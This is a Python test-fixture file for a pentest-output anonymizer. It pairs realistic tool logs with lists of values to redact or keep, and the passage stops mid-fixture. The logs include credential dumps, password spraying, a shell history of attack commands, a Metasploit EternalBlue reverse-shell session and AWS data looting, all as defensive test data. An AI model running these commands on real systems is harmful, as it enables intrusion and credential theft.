"""
Pentest output fixtures with ground truth.

Each fixture defines:
  text            — realistic tool output containing sensitive data
  must_anonymize  — strings that MUST NOT appear after anonymization (0% leak policy)
  safe_to_keep    — generic strings that SHOULD survive anonymization
"""
from dataclasses import dataclass, field


@dataclass
class PentestFixture:
    name: str
    description: str
    text: str
    must_anonymize: list[str]
    safe_to_keep: list[str] = field(default_factory=list)


# ── Fixtures ──────────────────────────────────────────────────────────────────

NMAP_SCAN = PentestFixture(
    name="nmap_full_scan",
    description="nmap -sV -sC against domain controller and surrounding hosts",
    text="""\
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 10:23 EST
Nmap scan report for dc01.contoso.local (10.10.50.5)
Host is up (0.0012s latency).
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTOSO.LOCAL)
445/tcp   open  microsoft-ds  Windows Server 2008 R2 (workgroup: CONTOSO)
| ssl-cert: Subject: commonName=dc01.contoso.local
Nmap scan report for webserver01.contoso.local (10.10.50.15)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS 10.0
Nmap scan report for fileserver-prd.contoso.local (10.10.50.20)
PORT    STATE SERVICE VERSION
445/tcp open  microsoft-ds
Nmap scan report for vpn-gw.contoso.local (10.10.50.1)
Nmap done: 10.10.50.0/24 (256 hosts) scanned in 127.33 seconds
""",
    must_anonymize=[
        "dc01.contoso.local", "10.10.50.5", "CONTOSO.LOCAL", "CONTOSO",
        "webserver01.contoso.local", "10.10.50.15",
        "fileserver-prd.contoso.local", "10.10.50.20",
        "vpn-gw.contoso.local", "10.10.50.1",
        "10.10.50.0/24",
    ],
    safe_to_keep=[
        # "nmap" only appears inside https://nmap.org URL which is correctly anonymized
        "kerberos-sec", "microsoft-ds", "ldap", "tcp", "open",
        # Service versions — must survive (needed for CVE matching)
        "Microsoft IIS 10.0", "Microsoft DNS 6.1.7601", "Windows Server 2008 R2",
    ],
)

MIMIKATZ_OUTPUT = PentestFixture(
    name="mimikatz_lsadump",
    description="sekurlsa::logonpasswords dump with NTLM hashes and cleartext",
    text="""\
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 63929 (00000000:0000f9b9)
Session           : Interactive from 1
User Name         : john.smith
Domain            : CONTOSO
Logon Server      : DC01
        msv :
         * Username : john.smith
         * Domain   : CONTOSO
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : aabbccddeeff00112233445566778899aabbccdd
        wdigest :
         * Username : john.smith
         * Domain   : CONTOSO
         * Password : C0nt0s0@2024!

Authentication Id : 0 ; 71234
User Name         : jane.doe
Domain            : CONTOSO
         * NTLM     : 5f4dcc3b5aa765d61d8327deb882cf99
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

Authentication Id : 0 ; 996
User Name         : svc_mssql
Domain            : CONTOSO
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
""",
    must_anonymize=[
        "john.smith", "CONTOSO", "DC01",
        "8846f7eaee8fb117ad06bdd830b7586c",
        "aabbccddeeff00112233445566778899aabbccdd",
        "C0nt0s0@2024!",
        "jane.doe",
        "5f4dcc3b5aa765d61d8327deb882cf99",
        "da39a3ee5e6b4b0d3255bfef95601890afd80709",
        "svc_mssql",
        "31d6cfe0d16ae931b73c59d7e0c089c0",
    ],
    safe_to_keep=["mimikatz", "sekurlsa", "NTLM", "SHA1", "wdigest", "msv"],
)

CRACKMAPEXEC_OUTPUT = PentestFixture(
    name="crackmapexec_smb",
    description="CrackMapExec SMB spray with valid credentials",
    text="""\
SMB  10.10.50.5   445  DC01         [*] Windows Server 2008 R2 (name:DC01) (domain:CONTOSO.LOCAL)
SMB  10.10.50.5   445  DC01         [+] CONTOSO.LOCAL\\administrator:Admin@Contoso2024 (Pwn3d!)
SMB  10.10.50.15  445  WEBSERVER01  [*] Windows Server 2016 (name:WEBSERVER01) (domain:CONTOSO.LOCAL)
SMB  10.10.50.15  445  WEBSERVER01  [+] CONTOSO.LOCAL\\john.smith:C0nt0s0@2024! (Pwn3d!)
SMB  10.10.50.20  445  FILESERVER-PRD [*] Windows Server 2019 (name:FILESERVER-PRD) (domain:CONTOSO.LOCAL)
SMB  10.10.50.20  445  FILESERVER-PRD [-] CONTOSO.LOCAL\\guest: STATUS_LOGON_FAILURE
""",
    must_anonymize=[
        "10.10.50.5", "DC01", "CONTOSO.LOCAL",
        "administrator", "Admin@Contoso2024",
        "10.10.50.15", "WEBSERVER01",
        "john.smith", "C0nt0s0@2024!",
        "10.10.50.20", "FILESERVER-PRD",
    ],
    safe_to_keep=["SMB", "445", "Pwn3d", "STATUS_LOGON_FAILURE"],
)

BURP_REQUEST = PentestFixture(
    name="burp_http_request",
    description="Burp Suite captured POST to internal login endpoint",
    text="""\
POST /api/v2/auth/login HTTP/1.1
Host: intranet.contoso.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJqb2huLnNtaXRoIiwiZW1haWwiOiJqb2huLnNtaXRoQGNvbnRvc28uY29tIn0.SIGNATURE
X-Forwarded-For: 10.10.50.100
Cookie: session=a1b2c3d4e5f6789012345678901234ab; JSESSIONID=ABC123DEF456

{"username": "john.smith", "password": "C0nt0s0@2024!", "domain": "CONTOSO"}
""",
    must_anonymize=[
        "intranet.contoso.com",
        "john.smith", "john.smith@contoso.com",
        "C0nt0s0@2024!", "CONTOSO",
        "10.10.50.100",
        "a1b2c3d4e5f6789012345678901234ab",
    ],
    safe_to_keep=["POST", "HTTP/1.1", "Content-Type", "Authorization", "Bearer"],
)

ENUM4LINUX_OUTPUT = PentestFixture(
    name="enum4linux_users",
    description="enum4linux user enumeration via RPC",
    text="""\
 =========================================
|    Session Check on 10.10.50.5         |
 =========================================
[+] Server 10.10.50.5 allows null sessions

Domain Name: CONTOSO
Domain Sid:  S-1-5-21-1234567890-2234567890-3234567890

index: 0x1 Account: Administrator  Name: (null)         Desc: Built-in administrator
index: 0x2 Account: john.smith     Name: John Smith      Desc: IT Manager - ext 4521
index: 0x3 Account: jane.doe       Name: Jane Doe        Desc: Finance Director
index: 0x4 Account: svc_backup     Name: Backup Service  Desc: (null)
index: 0x5 Account: m.rodriguez    Name: Maria Rodriguez Desc: CEO Assistant
index: 0x6 Account: svc_mssql     Name: SQL Service     Desc: (null)
""",
    must_anonymize=[
        "10.10.50.5", "CONTOSO",
        "john.smith", "John Smith",
        "jane.doe", "Jane Doe",
        "svc_backup", "m.rodriguez", "Maria Rodriguez",
        "svc_mssql",
    ],
    safe_to_keep=["Administrator", "null sessions"],
)

RECON_NOTES = PentestFixture(
    name="recon_notes_freeform",
    description="Free-form analyst notes with mixed sensitive data",
    text="""\
# Engagement Notes — Contoso Corporation

Target: Contoso Corporation (HQ Austin TX)
External scope: 203.0.1.0/24
Internal scope: 10.10.0.0/16, 172.16.5.0/24

Key contacts (not in scope — FYI):
  - Michael Johnson <michael.johnson@contoso.com> — CTO
  - Sarah Williams  <s.williams@contoso.com>      — CISO

Infrastructure:
  DC01  10.10.50.5  dc01.contoso.local   (Primary DC, Win2008R2)
  DC02  10.10.50.6  dc02.contoso.local   (Backup DC)
  WEB01 10.10.50.15 webserver01.contoso.local
  VPN   203.0.1.11  vpn.contoso.com      (Cisco AnyConnect)
  MAIL  203.0.1.10  mail.contoso.com     (Exchange 2019)

Credentials obtained:
  john.smith / C0nt0s0@2024!   (DA via john.smith local admin on WEB01)
  administrator / Admin@Contoso2024  (Domain Admin)

AD domain: CONTOSO.LOCAL  NetBIOS: CONTOSO
""",
    must_anonymize=[
        "Contoso Corporation", "contoso.com", "contoso.local", "CONTOSO.LOCAL", "CONTOSO",
        "203.0.1.0/24", "10.10.0.0/16", "172.16.5.0/24",
        "michael.johnson@contoso.com", "s.williams@contoso.com",
        "Michael Johnson", "Sarah Williams",
        "DC01", "10.10.50.5", "dc01.contoso.local",
        "DC02", "10.10.50.6", "dc02.contoso.local",
        "10.10.50.15", "webserver01.contoso.local",
        "203.0.1.11", "vpn.contoso.com",
        "203.0.1.10", "mail.contoso.com",
        "john.smith", "C0nt0s0@2024!",
        "administrator", "Admin@Contoso2024",
    ],
    safe_to_keep=[
        "Cisco", "AnyConnect", "Exchange", "CTO", "CISO", "VPN",
        "Exchange 2019", "Win2008R2",
    ],
)

BASH_HISTORY = PentestFixture(
    name="bash_command_history",
    description="Shell history during an engagement with inline credentials",
    text="""\
nmap -sV -sC -p- 10.10.50.0/24 -oN contoso_fullscan.txt
crackmapexec smb 10.10.50.5 -u john.smith -p 'C0nt0s0@2024!'
impacket-secretsdump CONTOSO/john.smith:'C0nt0s0@2024!'@10.10.50.5
evil-winrm -i 10.10.50.5 -u administrator -p 'Admin@Contoso2024'
bloodhound-python -u john.smith -p 'C0nt0s0@2024!' -d contoso.local -ns 10.10.50.5
smbclient //10.10.50.20/C$ -U CONTOSO/administrator%Admin@Contoso2024
hashcat -m 1000 contoso_hashes.txt /usr/share/wordlists/rockyou.txt
ssh -i ~/.ssh/contoso_key john.smith@203.0.1.15
curl -sk https://intranet.contoso.com/api/v1/users -H 'Authorization: Bearer abc123token456xyz'
""",
    must_anonymize=[
        "10.10.50.0/24", "10.10.50.5", "10.10.50.20",
        "john.smith", "C0nt0s0@2024!", "CONTOSO",
        "administrator", "Admin@Contoso2024",
        "contoso.local", "203.0.1.15",
        "intranet.contoso.com",
        "abc123token456xyz",
    ],
    safe_to_keep=["nmap", "crackmapexec", "impacket", "evil-winrm", "bloodhound", "hashcat", "ssh"],
)

LDAP_DUMP = PentestFixture(
    name="ldap_domain_dump",
    description="ldapdomaindump / BloodHound collection notes",
    text="""\
[*] Connecting to 10.10.50.5
[*] Logging in as CONTOSO\\john.smith
[*] Domain: CONTOSO.LOCAL
[*] Domain Controller: dc01.contoso.local
[*] Found 247 users, 43 groups, 89 computers

Computers:
  DC01.CONTOSO.LOCAL          (10.10.50.5)
  WEBSERVER01.CONTOSO.LOCAL   (10.10.50.15)
  FILESERVER-PRD.CONTOSO.LOCAL (10.10.50.20)
  LAPTOP-JSMITH.CONTOSO.LOCAL (10.10.60.101)

High-value users:
  CN=john.smith,OU=IT,DC=CONTOSO,DC=LOCAL   memberOf: Domain Admins
  CN=jane.doe,OU=Finance,DC=CONTOSO,DC=LOCAL
  CN=svc_backup,OU=ServiceAccounts,DC=CONTOSO,DC=LOCAL  (Unconstrained delegation!)

[*] Saved to: /home/operator/engagements/contoso/bloodhound_data/
""",
    must_anonymize=[
        "10.10.50.5", "CONTOSO", "CONTOSO.LOCAL",
        "john.smith", "dc01.contoso.local",
        "WEBSERVER01.CONTOSO.LOCAL", "10.10.50.15",
        "FILESERVER-PRD.CONTOSO.LOCAL", "10.10.50.20",
        "LAPTOP-JSMITH.CONTOSO.LOCAL", "10.10.60.101",
        "jane.doe", "svc_backup",
        "/home/operator/engagements/contoso/",
    ],
    safe_to_keep=["Domain Admins", "Unconstrained delegation"],
)

METASPLOIT_SESSION = PentestFixture(
    name="metasploit_session",
    description="Metasploit session info and post-exploitation",
    text="""\
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.99.5:4444
[*] 10.10.50.15:445 - Connecting to target for exploitation.
[+] 10.10.50.15:445 - Connection established for exploitation.
[+] 10.10.50.15:445 - Target OS selected valid for exploitation!
[*] 10.10.50.15:445 - CORE raw buffer dump (38 bytes)
[+] 10.10.50.15:445 - ETERNALBLUE overwrite completed!
[*] Sending stage to 10.10.50.15
[*] Meterpreter session 1 opened (10.10.99.5:4444 -> 10.10.50.15:49231)

meterpreter > sysinfo
Computer     : WEBSERVER01
OS           : Windows Server 2016 (10.0 Build 14393)
Domain       : CONTOSO
Logged On Users: 3
meterpreter > getuid
Server username: CONTOSO\\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
john.smith:1105:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
""",
    must_anonymize=[
        "10.10.99.5", "10.10.50.15",
        "WEBSERVER01", "CONTOSO",
        "john.smith",
        "8846f7eaee8fb117ad06bdd830b7586c",
        "aad3b435b51404eeaad3b435b51404ee",
    ],
    safe_to_keep=[
        "msf6", "meterpreter", "sysinfo", "hashdump", "ETERNALBLUE", "SYSTEM",
        "Windows Server 2016", "10.0 Build 14393",
    ],
)


AWS_CREDENTIAL_LEAK = PentestFixture(
    name="aws_credential_leak",
    description="AWS credentials extracted from .env / ~/.aws/credentials during pentest",
    text="""\
[+] Found .env file at /var/www/html/acme-portal/.env
[+] Found ~/.aws/credentials for user ubuntu

--- /var/www/html/acme-portal/.env ---
APP_ENV=production
APP_KEY=base64:xK9mP2qLnRvT4wYzAb3cDeFgHiJkMnOpQrStUvWx=
DB_HOST=db.internal.acme.io
DB_USER=acme_prod
DB_PASS=Acme$ecureDB#2024
AWS_ACCESS_KEY_ID=AKIAQFV3KZXAMPLE7YUI
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1
S3_BUCKET=acme-prod-backups
SENDGRID_API_KEY=SG.xKmNpQrStUv_WxYzAbCdEfGhIjKlMnOpQrStUvWxYz

--- ~/.aws/credentials ---
[default]
aws_access_key_id     = AKIAQFV3KZXAMPLE7YUI
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

[acme-prod]
aws_access_key_id     = AKIAQFV3KZOTHERPROD1
aws_secret_access_key = 9drTJvcXLB89Wagm48Lgd0zkh5By/Js98765ACME
role_arn              = arn:aws:iam::123456789012:role/AcmeDeployRole
""",
    must_anonymize=[
        "acme-portal", "acme.io", "acme-prod-backups",
        "acme_prod", "Acme$ecureDB#2024",
        "AKIAQFV3KZXAMPLE7YUI", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "AKIAQFV3KZOTHERPROD1", "9drTJvcXLB89Wagm48Lgd0zkh5By/Js98765ACME",
        "arn:aws:iam::123456789012:role/AcmeDeployRole",
        "123456789012",
        "SG.xKmNpQrStUv_WxYzAbCdEfGhIjKlMnOpQrStUvWxYz",
        "db.internal.acme.io",
    ],
    safe_to_keep=["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "aws_access_key_id",
                  "us-east-1", "S3_BUCKET", "APP_ENV", "DB_HOST"],
)

CLOUD_PENTEST_SESSION = PentestFixture(
    name="cloud_pentest_session",
    description="AWS CLI recon after credential compromise — S3, IAM, EC2 enumeration",
    text="""\
$ aws sts get-caller-identity
{
    "UserId": "AIDAQFV3KZXAMPLE7YUI",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/deploy-bot"
}

$ aws s3 ls
2024-01-10  acme-prod-backups
2024-01-10  acme-dev-artifacts
2023-11-05  acme-terraform-state

$ aws s3 sync s3://acme-prod-backups /tmp/loot/
download: s3://acme-prod-backups/db/2024-01-14-full.sql.gz to /tmp/loot/2024-01-14-full.sql.gz
download: s3://acme-prod-backups/secrets/prod.env to /tmp/loot/prod.env

$ aws iam list-users --query 'Users[*].[UserName,CreateDate]'
[["deploy-bot","2022-03-15"],["rafael.torres","2021-09-01"],["ana.lima","2022-01-20"],["svc-ci","2021-07-10"]]

$ aws ec2 describe-instances --query 'Reservations[*].Instances[*].[PrivateIpAddress,PublicIpAddress,Tags]'
[[[["172.16.10.5","54.233.100.12",[{"Key":"Name","Value":"acme-api-prod"}]]]],
 [[["172.16.10.6","54.233.100.13",[{"Key":"Name","Value":"acme-db-primary"}]]]],
 [[["172.16.10.7",null,[{"Key":"Name","Value":"acme-ci-runner"}]]]]]
""",
    must_anonymize=[
        "AIDAQFV3KZXAMPLE7YUI", "123456789012",
        "arn:aws:iam::123456789012:user/deploy-bot",
        "acme-prod-backups", "acme-dev-artifacts", "acme-terraform-state",
        "rafael.torres", "ana.lima",
        "172.16.10.5", "54.233.100.12",
        "172.16.10.6", "54.233.100.13",
        "172.16.10.7",
        "acme-api-prod", "acme-db-primary", "acme-ci-runner",
    ],
    safe_to_keep=["aws", "s3", "iam", "ec2", "sts", "describe-instances", "list-users",
                  "PrivateIpAddress", "PublicIpAddress", "UserName"],
)

CORPORATE_EMAIL_LEAK = PentestFixture(
    name="corporate_email_leak",
    description="Phishing campaign target list + HR spreadsheet extracted from file share",
    text="""\
Subject: RE: Q4 2024 Board Meeting — Action Items
From: patricia.mendes@acmecorp.com.br
To: board@acmecorp.com.br
CC: cfo@acmecorp.com.br; legal@acmecorp.com.br

Confirming attendance for the board meeting on 2024-12-10.
Contact: Patricia Mendes, +55 11 9 8765-4321, ext. 2201
CNPJ: 12.345.678/0001-99 (Acme Corp Ltda)

---

[HR_EMPLOYEES_2024.xlsx — extracted from \\\\fileserver01\\hr\\confidential]

Nome,CPF,Email,Departamento,Salario
Patricia Mendes,123.456.789-01,patricia.mendes@acmecorp.com.br,Diretoria,45000
Rafael Torres,234.567.890-12,rafael.torres@acmecorp.com.br,TI,12000
Ana Lima,345.678.901-23,ana.lima@acmecorp.com.br,Financeiro,14000
Carlos Souza,456.789.012-34,c.souza@acmecorp.com.br,RH,11000
""",
    must_anonymize=[
        "patricia.mendes@acmecorp.com.br", "board@acmecorp.com.br",
        "cfo@acmecorp.com.br", "legal@acmecorp.com.br",
        "Patricia Mendes", "+55 11 9 8765-4321",
        "12.345.678/0001-99", "Acme Corp Ltda",
        "acmecorp.com.br",
        "123.456.789-01", "234.567.890-12",
        "345.678.901-23", "456.789.012-34",
        "Rafael Torres", "Ana Lima", "Carlos Souza",
        "rafael.torres@acmecorp.com.br", "ana.lima@acmecorp.com.br",
        "c.souza@acmecorp.com.br",
        "fileserver01",
    ],
    safe_to_keep=["CPF", "Email", "Departamento", "Salario", "Nome", "xlsx"],
)

PRIVESC_CONFIG_DUMP = PentestFixture(
    name="privesc_config_dump",
    description="Config files found during privilege escalation — mixed secrets",
    text="""\
[+] /etc/passwd readable — interesting users:
root:x:0:0:root:/root:/bin/bash
jenkins:x:115:120:Jenkins Continuous Integration,,,:/var/lib/jenkins:/bin/bash
deploy:x:1001:1001:Deploy Bot:/home/deploy:/bin/bash

[+] Writable config: /opt/jenkins/secrets/master.key
b0d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4

[+] /home/deploy/.ssh/id_rsa:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBXGHFakeKeyBodyHereForTestingXXXXXXXXXXXXXXXXXXXXXXXA
AAAAKHkpGDFakeKeyFooterXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-----END OPENSSH PRIVATE KEY-----

[+] /opt/app/config/database.yml:
production:
  adapter: postgresql
  host: db-primary.acmecorp.internal
  port: 5432
  database: acme_production
  username: acme_db_user
  password: "Pr0d_DB_P@ss#2024!"
  ssl_mode: require

[+] /opt/app/.env:
STRIPE_SECRET_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dc
REDIS_URL=redis://:RedisPr0d!@redis-01.acmecorp.internal:6379/0
JWT_SECRET=MySuperSecretJWT_Key_AcmeProd_2024
ADMIN_EMAIL=admin@acmecorp.com.br
""",
    must_anonymize=[
        "b0d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4",
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "db-primary.acmecorp.internal",
        "acme_production", "acme_db_user", "Pr0d_DB_P@ss#2024!",
        "acmecorp.internal",
        "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
        "RedisPr0d!", "redis-01.acmecorp.internal",
        "MySuperSecretJWT_Key_AcmeProd_2024",
        "admin@acmecorp.com.br",
        "acmecorp.com.br",
    ],
    safe_to_keep=[
        "jenkins", "deploy", "postgresql", "redis", "STRIPE_SECRET_KEY",
        "REDIS_URL", "JWT_SECRET", "ssl_mode", "adapter",
        # Technology versions must survive
        "5432", "ssl_mode",
    ],
)

AZURE_AD_DUMP = PentestFixture(
    name="azure_ad_recon",
    description="Azure AD tenant recon via ROADtools / az cli after token theft",
    text="""\
[*] Fetching Azure AD tenant info...
Tenant ID      : 9b3e1a2c-4d5f-6e7a-8b9c-0d1e2f3a4b5c
Tenant Name    : Acme Corp
Primary Domain : acmecorp.onmicrosoft.com

[*] Users (high-privilege):
  DisplayName       : Roberto Alves
  UPN               : roberto.alves@acmecorp.com
  ObjectId          : a1b2c3d4-e5f6-7890-abcd-ef1234567890
  Roles             : Global Administrator

  DisplayName       : Mariana Costa
  UPN               : mariana.costa@acmecorp.com
  ObjectId          : b2c3d4e5-f6a7-8901-bcde-f12345678901
  Roles             : Exchange Administrator, Security Reader

[*] Service Principal (interesting):
  AppId             : c3d4e5f6-a7b8-9012-cdef-012345678902
  DisplayName       : acme-github-actions
  Secret expires    : 2025-06-01

[*] Conditional Access — MFA NOT enforced for:
  Legacy clients (Exchange ActiveSync)
  Service principal: acme-github-actions

[*] Access token (valid 1h):
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhMWIyYzNkNC1lNWY2LTc4OTAtYWJjZC1lZjEyMzQ1Njc4OTAiLCJ1cG4iOiJyb2JlcnRvLmFsdmVzQGFjbWVjb3JwLmNvbSIsInRpZCI6IjliM2UxYTJjLTRkNWYtNmU3YS04YjljLTBkMWUyZjNhNGI1YyIsInJvbGVzIjpbIkdsb2JhbEFkbWluaXN0cmF0b3IiXX0.FAKESIGNATUREXX
""",
    must_anonymize=[
        "9b3e1a2c-4d5f-6e7a-8b9c-0d1e2f3a4b5c",
        "Acme Corp", "acmecorp.onmicrosoft.com", "acmecorp.com",
        "Roberto Alves", "roberto.alves@acmecorp.com",
        "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
        "Mariana Costa", "mariana.costa@acmecorp.com",
        "b2c3d4e5-f6a7-8901-bcde-f12345678901",
        "c3d4e5f6-a7b8-9012-cdef-012345678902",
        "acme-github-actions",
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhMWIyYzNkNC1lNWY2LTc4OTAtYWJjZC1lZjEyMzQ1Njc4OTAiLCJ1cG4iOiJyb2JlcnRvLmFsdmVzQGFjbWVjb3JwLmNvbSIsInRpZCI6IjliM2UxYTJjLTRkNWYtNmU3YS04YjljLTBkMWUyZjNhNGI1YyIsInJvbGVzIjpbIkdsb2JhbEFkbWluaXN0cmF0b3IiXX0.FAKESIGNATUREXX",
    ],
    safe_to_keep=["Azure", "Tenant", "MFA", "Exchange", "Conditional Access",
                  "Global Administrator", "Service Principal"],
)


NMAP_SERVICE_VERSIONS = PentestFixture(
    name="nmap_service_versions",
    description="nmap -sV output — service versions must survive, only IPs/hostnames anonymized",
    text="""\
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-10 14:55 EST
Nmap scan report for web01.meridional.local (192.168.10.15)
Host is up (0.00089s latency).
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.51 ((Ubuntu))
443/tcp  open  ssl/https  Apache httpd 2.4.51 ((Ubuntu))
3306/tcp open  mysql      MySQL 5.7.38-log
8080/tcp open  http       Apache Tomcat 9.0.68

Nmap scan report for db01.meridional.local (192.168.10.20)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql      MySQL 8.0.30
5432/tcp open  postgresql PostgreSQL DB 14.5

Nmap scan report for mail.meridional.local (192.168.10.25)
PORT    STATE SERVICE  VERSION
25/tcp  open  smtp     Postfix smtpd
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)

Nmap scan report for intranet.meridional.com (203.0.113.10)
PORT    STATE SERVICE VERSION
443/tcp open  ssl/http Microsoft IIS 10.0
| http-server-header: Microsoft-IIS/10.0
| http-title: Meridional Intranet Portal
80/tcp  open  http    Microsoft IIS 10.0

Nmap done: 4 IP addresses (4 hosts up) scanned in 18.22 seconds
""",
    must_anonymize=[
        # Hosts and IPs — unique to this target
        "web01.meridional.local", "192.168.10.15",
        "db01.meridional.local", "192.168.10.20",
        "mail.meridional.local", "192.168.10.25",
        "intranet.meridional.com", "203.0.113.10",
        "meridional.local", "meridional.com",
        # Page title leaks org name
        "Meridional Intranet Portal",
    ],
    safe_to_keep=[
        # All service versions MUST survive — essential for CVE analysis
        "OpenSSH 7.4", "protocol 2.0",
        "Apache httpd 2.4.51",
        "MySQL 5.7.38-log",
        "Apache Tomcat 9.0.68",
        "OpenSSH 8.2p1",
        "MySQL 8.0.30",
        "PostgreSQL DB 14.5",
        "Postfix smtpd",
        "Dovecot imapd",
        "nginx 1.18.0",
        "Microsoft IIS 10.0",
        "Microsoft-IIS/10.0",
        # Generic tech terms (not tool URL — https://nmap.org is correctly anonymized as a URL)
        "ssh", "http", "https", "smtp", "imap", "mysql", "postgresql",
    ],
)


KERBEROASTING = PentestFixture(
    name="kerberoasting",
    description="GetUserSPNs.py + hashcat cracking of Kerberos TGS tickets",
    text="""\
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName                    Name           MemberOf                               PasswordLastSet
--------------------------------------  -------------  -------------------------------------  -------------------
MSSQLSvc/db01.nordvento.local:1433      svc_mssql      CN=Domain Users,DC=NORDVENTO,DC=LOCAL  2023-11-15 09:12:33
HTTP/intranet.nordvento.local           svc_web        CN=Domain Users,DC=NORDVENTO,DC=LOCAL  2024-01-08 14:55:01
CIFS/fileserver.nordvento.local         svc_backup     CN=Domain Users,DC=NORDVENTO,DC=LOCAL  2022-06-20 08:00:00

$krb5tgs$23$*svc_mssql$NORDVENTO.LOCAL$MSSQLSvc/db01.nordvento.local:1433*$8b3f2a1c4d5e6f7a8b9c0d1e2f3a4b5c$1234567890abcdef1234567890abcdef12345678901234567890abcdef1234567890abcdef12345678901234567890abcdef1234567890
$krb5tgs$23$*svc_web$NORDVENTO.LOCAL$HTTP/intranet.nordvento.local*$9c4f3b2d5e6f7a8b9c0d1e2f3a4b5c6d$fedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321fedcba0987

Cracking with hashcat -m 13100:
$krb5tgs$23$*svc_mssql$...: Nordvento@SQL2024!
$krb5tgs$23$*svc_web$...:   W3bS3rv1c3#Pass

Session..........: hashcat
Status...........: Cracked
""",
    must_anonymize=[
        "db01.nordvento.local", "intranet.nordvento.local", "fileserver.nordvento.local",
        "NORDVENTO.LOCAL", "NORDVENTO",
        "svc_mssql", "svc_web", "svc_backup",
        "Nordvento@SQL2024!", "W3bS3rv1c3#Pass",
        "8b3f2a1c4d5e6f7a8b9c0d1e2f3a4b5c",
        "9c4f3b2d5e6f7a8b9c0d1e2f3a4b5c6d",
    ],
    safe_to_keep=[
        "Impacket", "hashcat", "krb5tgs",
        "MSSQLSvc", "HTTP", "CIFS", "Domain Users",
        "13100", "Cracked",
    ],
)

SQLMAP_OUTPUT = PentestFixture(
    name="sqlmap_injection",
    description="sqlmap automated SQLi on internal web app — DB dump with employee data",
    text="""\
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.8#stable}

[*] starting @ 14:30:05 /2024-03-12/

[14:30:05] [INFO] testing connection to the target URL
[14:30:06] [INFO] testing if the target URL content is stable
[14:30:06] [INFO] target URL content is stable
[14:30:08] [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

Database: solaris_erp_prod
[3 tables]
+------------------+
| employees        |
| salary_history   |
| user_credentials |
+------------------+

Table: user_credentials
[4 entries]
+----+-----------------------+------------------------------------------+------------------+
| id | username              | password_hash                            | email            |
+----+-----------------------+------------------------------------------+------------------+
| 1  | admin                 | 5f4dcc3b5aa765d61d8327deb882cf99         | admin@solaris.io |
| 2  | rafael.moura          | e10adc3949ba59abbe56e057f20f883e         | r.moura@solaris.io |
| 3  | carla.nascimento       | 8d3533d75ae2c3966d7e0d4fcc69216b         | c.nascimento@solaris.io |
| 4  | ti_helpdesk           | 96e79218965eb72c92a549dd5a330112         | helpdesk@solaris.io |
+----+-----------------------+------------------------------------------+------------------+

[14:31:44] [INFO] fetched data logged to text files under '/home/operator/sqlmap/solaris_2024/'
""",
    must_anonymize=[
        "solaris_erp_prod", "solaris.io",
        "admin@solaris.io", "r.moura@solaris.io",
        "c.nascimento@solaris.io", "helpdesk@solaris.io",
        "rafael.moura", "carla.nascimento", "ti_helpdesk",
        "5f4dcc3b5aa765d61d8327deb882cf99",
        "e10adc3949ba59abbe56e057f20f883e",
        "8d3533d75ae2c3966d7e0d4fcc69216b",
        "96e79218965eb72c92a549dd5a330112",
        "/home/operator/sqlmap/solaris_2024/",
    ],
    safe_to_keep=[
        "1.7.8", "GET", "id", "stable",
        "employees", "salary_history", "user_credentials",
        "password_hash", "username", "email",
    ],
)

KUBERNETES_PENTEST = PentestFixture(
    name="kubernetes_pentest",
    description="K8s secret dump + pod exec after RBAC misconfiguration",
    text="""\
$ kubectl get secrets -n producao --kubeconfig=/tmp/stolen.kubeconfig
NAME                          TYPE                DATA   AGE
vortex-db-credentials         Opaque              3      45d
vortex-api-jwt-secret         Opaque              1      45d
